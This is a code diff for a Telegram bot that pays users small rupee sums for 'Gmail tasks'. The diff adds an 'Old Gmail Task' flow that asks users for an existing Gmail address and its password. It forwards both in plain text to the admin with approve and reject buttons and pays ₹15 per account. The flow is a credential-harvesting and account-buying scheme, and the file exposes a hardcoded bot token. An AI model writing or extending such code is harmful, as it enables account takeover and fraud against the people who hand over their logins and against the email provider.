@@ -9,7 +9,7 @@ TOKEN = '8683212510:AAEdE8kq5-5GuKerfPa_Mzaxovgb-J5VU4w'
 ADMIN_ID = 8894779077  
 ADMIN_USERNAME = 'Verified_Bandaa' 
 
-# Conversion Rate: 1 USDT = ₹94 (Aap apne hisaab se ise change kar sakte hain)
+# Conversion Rate: 1 USDT = ₹94
 USDT_TO_INR_RATE = 94.0  
 
 bot = telebot.TeleBot(TOKEN)
@@ -64,8 +64,9 @@ def get_all_users():
 # --- MAIN MENU ---
 def main_menu(user_id):
     markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row(KeyboardButton("📧 Gmail Task"), KeyboardButton("💰 Wallet"))
-    markup.row(KeyboardButton("💸 Withdraw"), KeyboardButton("📞 Contact & Help"))
+    markup.row(KeyboardButton("📧 Gmail Task"), KeyboardButton("📧 Old Gmail Task"))
+    markup.row(KeyboardButton("💰 Wallet"), KeyboardButton("💸 Withdraw"))
+    markup.row(KeyboardButton("📞 Contact & Help"))
     if user_id == ADMIN_ID:
         markup.row(KeyboardButton("⚙️ Admin Panel"))
     return markup
@@ -96,6 +97,12 @@ def handle_text(message):
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("✅ Click Here When Done", callback_data="task_done"))
         bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=markup)
+
+    elif text == "📧 Old Gmail Task":
+        msg = ("📧 *OLD GMAIL TASK*\n\n"
+               "👉 Kripya apna **Old Gmail Account** yahan bhejein (jise aap submit karna chahte hain):")
+        bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=telebot.types.ReplyKeyboardRemove())
+        user_states[user_id] = {'state': 'old_gmail_email'}
 
     elif text == "💰 Wallet":
         balance_inr = get_balance(user_id)
@@ -163,7 +170,7 @@ def handle_text(message):
             msg = "📜 *WITHDRAWAL HISTORY:*\n\n"
             for r in records:
                 r_usd = r[1] / USDT_TO_INR_RATE
-                msg += f"🔴 *₹{r[1]} (${r_usd:.2f}u)* | {r[0]}\n📅 {r[2]}\n\n"
+                msg += f"🔴 *₹{r[1]} (${r_usd:.2f}u)* | {r[0]}\n📅 {r[1]}\n\n"
             bot.send_message(user_id, msg, parse_mode="Markdown")
 
     # --- ADMIN PANEL OPTIONS ---
@@ -177,8 +184,33 @@ def handle_text(message):
     elif user_id in user_states:
         state_data = user_states[user_id]
         
+        # Old Gmail Task - Step 1: Email received, now ask Password
+        if state_data['state'] == 'old_gmail_email':
+            gmail_email = text
+            user_states[user_id] = {'state': 'old_gmail_password', 'gmail_email': gmail_email}
+            bot.send_message(user_id, f"✅ Email saved: `{gmail_email}`\n\n👉 Ab iska *Password* bhejein:", parse_mode="Markdown")
+
+        # Old Gmail Task - Step 2: Password received, submit to Admin
+        elif state_data['state'] == 'old_gmail_password':
+            gmail_pass = text
+            gmail_email = state_data['gmail_email']
+            
+            bot.send_message(user_id, "✅ *Old Gmail Submitted!*\nAapka task Admin ke paas bhej diya gaya hai. Check hone ke baad reward add ho jayega.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+            
+            # Send to Admin Panel
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"oldappr_{user_id}"),
+                       InlineKeyboardButton("❌ Reject", callback_data=f"oldrej_{user_id}"))
+            
+            admin_msg = (f"🔔 *NEW OLD GMAIL SUBMISSION*\n\n"
+                         f"👤 *User ID:* `{user_id}`\n"
+                         f"📧 *Gmail:* `{gmail_email}`\n"
+                         f"🔑 *Password:* `{gmail_pass}`")
+            bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown", reply_markup=markup)
+            del user_states[user_id]
+
         # Withdraw Amount
-        if state_data['state'] == 'withdraw_amount':
+        elif state_data['state'] == 'withdraw_amount':
             try:
                 input_val = float(text)
                 method = state_data['method']
@@ -225,7 +257,6 @@ def handle_text(message):
             
             bot.send_message(user_id, "✅ *Request Submitted!*\nAapka withdrawal request Admin ko bhej diya gaya hai. Approve hone par payment mil jayegi.", parse_mode="Markdown", reply_markup=main_menu(user_id))
             
-            # Notify Admin
             markup = InlineKeyboardMarkup()
             markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"apprw_{pending_id}"),
                        InlineKeyboardButton("❌ Reject", callback_data=f"rejcc_{pending_id}"))
@@ -304,6 +335,22 @@ def callback_query(call):
         bot.send_message(user_id, "💸 *Add Balance Mode*\n\n👉 Kripya us user ka *Telegram ID* bhejein jisme paise add karne hain:", parse_mode="Markdown")
         user_states[user_id] = {'state': 'admin_wait_uid'}
 
+    # Old Gmail Task Approval
+    elif call.data.startswith("oldappr_"):
+        target_user = int(call.data.split("_")[1])
+        add_balance(target_user, 15.0, "Old Gmail Task Approved")
+        try:
+            bot.send_message(target_user, "🎉 *Old Gmail Approved!*\n₹15 aapke Wallet me add kar diye gaye hain.", parse_mode="Markdown")
+        except: pass
+        bot.edit_message_text(f"✅ Old Gmail Approved for `{target_user}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
+    elif call.data.startswith("oldrej_"):
+        target_user = int(call.data.split("_")[1])
+        try:
+            bot.send_message(target_user, "❌ *Old Gmail Rejected!*\nAapka Old Gmail task reject kar diya gaya hai.", parse_mode="Markdown")
+        except: pass
+        bot.edit_message_text(f"❌ Old Gmail Rejected for `{target_user}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
     elif call.data.startswith("apprt_"): 
         target_user = int(call.data.split("_")[1])
         add_balance(target_user, 15.0, "Gmail Task Approved")
@@ -339,7 +386,6 @@ def callback_query(call):
         req = cursor.fetchone()
         if req:
             target_user, display_amount, method = req
-            # Calculate back INR to refund
             refund_inr = display_amount if method == "🏦 UPI" else display_amount * USDT_TO_INR_RATE
             
             add_balance(target_user, refund_inr, f"Refund: {method} Withdraw Rejected")
@@ -370,6 +416,5 @@ def handle_photo(message):
         handle_all_media(message)
 
 # --- START BOT ---
-print("Bot with Currency Conversion is running...")
+print("Bot with Old Gmail Task is running...")
 bot.polling(none_stop=True)
-              
